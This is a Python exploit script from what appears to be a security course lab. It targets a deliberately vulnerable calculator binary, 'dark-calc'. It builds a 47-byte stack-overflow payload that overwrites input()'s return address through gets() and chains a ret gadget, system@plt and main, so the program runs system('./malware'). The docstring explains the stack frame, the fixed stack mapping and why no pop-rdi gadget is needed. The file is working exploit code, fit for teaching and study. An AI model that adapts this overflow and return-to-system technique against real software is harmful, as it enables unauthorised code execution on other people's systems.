#!/usr/bin/env python3
"""Lab3 Task 1 -- dark-calc: redirect input()'s return address to ./malware.

Frame of input() (see src/dark-calc.c):

    char expression[16]      <- gets() writes here        rbp - 0x10
    (8 bytes of padding)                                   rbp - 0x08
    saved rbp                                              rbp + 0x00
    return address (into main)                             rbp + 0x08

So the saved return address is 24 bytes above the buffer: 16 bytes of buffer
plus 8 bytes of saved rbp.

Two details of dark-calc matter here.

1. dark-calc moves its stack to a fixed mapping: init_fixed_stack mmaps
   0x721000000000..0x721000802000 with PROT_READ|PROT_WRITE|PROT_EXEC and
   mprotects the first and the last page to PROT_NONE; __wrap_main then sets
   %rsp = 0x721000801000.  So the buffer is always at 0x721000800fd0, but the
   usable stack ends at 0x721000801000: everything we write must stay below
   that address (that is why the payload below is 47 and not 48 bytes long --
   see the comment at the end).

2. When input() returns, %rdi still holds command_buf (0x6030d0), the
   destination that strcpy() was just called with.  And command_buf contains
   "./malware", because the NUL right after it makes strcpy() stop there.
   So we only have to redirect the return address to system(): no `pop rdi`
   gadget is needed.  (If a future glibc clobbered %rdi, the same payload
   works when the first gadget is 0x401a6b -- "mov $command_buf, %edi;
   call system" inside eval -- at the cost of a crash after the message.)

The chain:

    ret             0x4018c1   alignment: the ABI wants %rsp % 16 == 8 on a
                              function entry, and input()'s `ret` leaves us
                              at %rsp % 16 == 0
    system@plt      0x4017e0   system("./malware"), %rdi == command_buf
    main            0x401ac3   after system() returns, go back to the loop;
                              stdin is at EOF, so input() prints the answer
                              and calls exit(0) instead of crashing
"""

import struct
import sys

BUF_TO_RET = 24  # 16-byte buffer + 8-byte saved rbp

RET = 0x4018C1
SYSTEM_PLT = 0x4017E0
MAIN = 0x401AC3


def p64(value):
    return struct.pack("<Q", value)


payload = b"".join(
    [
        b"./malware\x00".ljust(BUF_TO_RET, b"A"),
        p64(RET),
        p64(SYSTEM_PLT),
        # The last qword lands at 0x721000800ff8 and gets() appends its NUL at
        # 0x721000801000, which is already the guard page.  Leaving the last
        # byte to gets() therefore costs nothing: 0x401ac3 has a zero top byte.
        p64(MAIN)[:7],
    ]
)

# gets() stops at a newline, so a 0x0a byte anywhere would truncate the payload.
assert b"\n" not in payload
assert len(payload) == 47

sys.stdout.buffer.write(payload)
